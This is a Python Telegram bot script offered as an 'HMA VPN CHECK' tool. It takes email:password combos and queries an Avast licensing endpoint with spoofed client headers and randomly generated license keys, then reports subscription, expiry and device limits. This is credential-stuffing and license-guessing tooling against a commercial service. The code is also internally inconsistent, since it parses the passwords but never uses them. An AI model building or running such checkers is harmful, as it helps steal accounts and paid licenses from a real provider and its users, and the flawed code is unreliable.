import requests
import time
import random
import string
import hashlib

def generate_random_string(pattern):
    return ''.join(random.choice(string.ascii_uppercase if ch == 'u' else string.digits if ch == 'd' else ch) for ch in pattern)

def generate_guid():
    return ''.join(random.choice(string.hexdigits) for _ in range(32))

def sha256_hash(value):
    return hashlib.sha256(value.encode()).hexdigest()

def process_hma_command(bot, message):
    chat_id = message.chat.id
    command_parts = message.text.split()[1:]  # Get the list of email:password

    if not command_parts:
        bot.send_message(chat_id, "Please provide email and password in the format: /hma email:password")
        return

    start_time = time.time()
    results = []
    initial_message = "↯ HMA VPN CHECK\n\n"
    msg = bot.send_message(chat_id, initial_message + get_footer_info(len(command_parts), start_time, message.from_user.username))

    for account in command_parts:
        result = check_hma_account(account)
        results.append(f"Combo: {account}\nResult => {result}")
        bot.edit_message_text(
            chat_id=chat_id,
            message_id=msg.message_id,
            text=initial_message + "\n\n".join(results) + "\n\n" + get_footer_info(len(command_parts), start_time, message.from_user.username)
        )

def check_hma_account(account):
    email, password = account.split(':')
    key = generate_random_string("?d?u?d?u?u?u-?u?u?u?u?u?d")
    guid = generate_guid()
    did = sha256_hash(guid)

    headers = {
        "Host": "my-win.avast.com",
        "User-Agent": "Avast Antivirus",
        "Accept": "*/*",
        "Vaar-Header-App-Build-Version": "6076",
        "Vaar-Header-App-Id": "00000000-0000-0000-0000-000000000000",
        "Vaar-Header-App-IPM-Product": "78",
        "Vaar-Header-App-Product-Brand": "PRIVAX",
        "Vaar-Header-App-Product-Edition": "HMA_VPN_CONSUMER",
        "Vaar-Header-App-Product-Mode": "PAID",
        "Vaar-Header-Device-Id": did,
        "Vaar-Header-Device-Platform": "WIN",
        "Vaar-Version": "0",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept-Encoding": "gzip, deflate",
        "Content-Length": "39"
    }

    data = {
        "walletKeys": [key]
    }

    response = requests.post("https://my-win.avast.com/v1/query/get-exact-application-licenses", headers=headers, json=data)
    
    if response.status_code == 200:
        response_data = response.json()
        if "mode" in response_data:
            subscription = response_data.get("mode", "UNKNOWN")
            expires = response_data.get("expires", "UNKNOWN")
            renewable = response_data.get("auto", "UNKNOWN")
            device_limit = response_data.get("maximum", "UNKNOWN")
            return (f"Subscription: {subscription}\n"
                    f"Expiry: {expires}\n"
                    f"Renewable: {renewable}\n"
                    f"Device Limit: {device_limit}")
        else:
            return "Failed to retrieve subscription information. Please try again."
    else:
        return "Unauthorized or failed to fetch data. Please check your input and try again."

def get_footer_info(total_accounts, start_time, username):
    elapsed_time = time.time() - start_time
    footer = (
        f"－－－－－－－－－－－－－－－－\n"
        f"⌧ Total ACCOUNT Checked - {total_accounts}\n"
        f"⌧ Time Taken - {elapsed_time:.2f} seconds\n"
        f"⌧ Checked by: {username}\n"
        f"⚡️ Bot by - AFTAB [BOSS]\n"
        f"－－－－－－－－－－－－－－－－"
    )
    return footer
